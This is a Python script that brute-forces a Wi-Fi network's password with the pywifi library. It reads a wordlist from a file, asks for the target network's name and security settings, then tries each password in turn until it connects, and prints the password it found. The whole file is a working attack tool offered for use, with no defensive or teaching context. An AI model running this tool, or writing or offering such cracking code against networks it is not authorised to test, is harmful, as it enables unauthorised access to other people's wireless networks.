import pywifi
from pywifi import const
import time
import sys
import os
import getopt
import argparse


def passwords_list():
    passwords = []
    with open(f, 'r', encoding='utf8') as words:
        for password in words:
            password = password.split("\n")
            passwords.append(password)
    return passwords


def profile_setup(name):
    profile = pywifi.Profile()
    profile.ssid = name
    auth = ""
    while auth not in ["1", "2"]:
        auth = input("Authentication type ? 1) OPEN 2) SHARED\n")
    if auth == "1":
        profile.auth = const.AUTH_ALG_OPEN
    else:
        profile.auth = const.AUTH_ALG_SHARED
    akm = ""
    while akm not in ["1", "2", "3", "4", "5"]:
        akm = input("Key management type ? 1) NONE 2) WPA 3) WPAPSK 4) WPA2 "
                    "5) WPA2PSK\n")
    if akm == "1":
        profile.akm.append(const.AKM_TYPE_NONE)
    elif akm == "2":
        profile.akm.append(const.AKM_TYPE_WPA)
    elif akm == "3":
        profile.akm.append(const.AKM_TYPE_WPAPSK)
    elif akm == "4":
        profile.akm.append(const.AKM_TYPE_WPA2)
    else:
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
    cipher = ""
    while cipher not in ["1", "2", "3", "4"]:
        cipher = input("Cipher type ? 1) NONE 2) WEP 3) TKIP 4) CCMP\n")
    if cipher == "1":
        profile.cipher = const.CIPHER_TYPE_NONE
    elif cipher == "2":
        profile.cipher = const.CIPHER_TYPE_WEP
    elif cipher == "3":
        profile.cipher = const.CIPHER_TYPE_TKIP
    else:
        profile.cipher = const.CIPHER_TYPE_CCMP
    return profile


def bruteforce():
    if os.getuid() != 0:
        print("You need to have root privileges to use this program. Please "
              "try again using 'sudo'.\n")
        sys.exit()
    passwords = passwords_list()
#    wifi = pywifi.PyWiFi()
#    interfaces = wifi.interfaces()[0]

    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]

    wifi_name = input("Enter the name of the wifi network you want to try to "
                      "bruteforce:\n")

    start_time = time.time()
    profile = profile_setup(wifi_name)
    for password in passwords:
        # profile.key = "rba5829qaBdk"
        profile.key = password
        profile.key = password[0]
        interface.remove_all_network_profiles()
        new_profile = interface.add_network_profile(profile)
        time.sleep(1)
        interface.connect(new_profile)

        while interface.status() == const.IFACE_CONNECTING:
            print("connecting pls wait")
            time.sleep(1)

        if interface.status() == const.IFACE_CONNECTED:
            print("Connected ! password for {} is {}\n".format(profile.ssid,
                                                               profile.key))
            print("Execution took {} seconds.".format(time.time()-start_time))
           # interface.disconnect()
            exit()
        else:
            print(profile.key)


f = ''
parser = argparse.ArgumentParser()
parser.add_argument("file")
args = parser.parse_args()
f = args.file
print(f)
if not os.path.exists(f):
    print(f)
    print("file does not exists.")
    sys.exit()
bruteforce()
